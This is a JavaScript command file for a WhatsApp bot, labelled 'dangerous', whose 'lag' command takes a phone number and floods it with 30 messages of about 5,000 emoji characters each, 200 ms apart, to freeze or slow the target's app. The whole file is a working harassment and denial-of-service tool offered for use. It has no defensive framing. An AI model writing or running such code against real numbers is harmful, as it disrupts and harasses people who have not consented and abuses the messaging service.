export default {
  name: 'lag',
  description: 'Lag a user\'s WhatsApp',
  category: 'dangerous',
  aliases: ['freeze', 'slow'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ LAG USER 〕━━━┈⊷
┃ Lag a user's WhatsApp.
┃ 
┃ Usage: ${prefix}lag <number>
┃ 
┃ Example: ${prefix}lag 27797352930
┃ 
┃ 🧛 "The darkness slows."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
      return;
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ LAGGING USER 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 
┃ 🧛 "The darkness slows..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      for (let i = 0; i < 30; i++) {
        try {
          let heavyMsg = '';
          for (let j = 0; j < 500; j++) {
            heavyMsg += '🩸🧛🌑💀🔥⚡🦇👻';
          }
          await sock.sendMessage(userJid, {
            text: heavyMsg.substring(0, 5000)
          });
          await new Promise(resolve => setTimeout(resolve, 200));
        } catch {}
      }

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ LAG SENT 〕━━━┈⊷
┃ 👤 ${target} lag sent!
┃ 
┃ 🧛 "The darkness slows."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });

    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
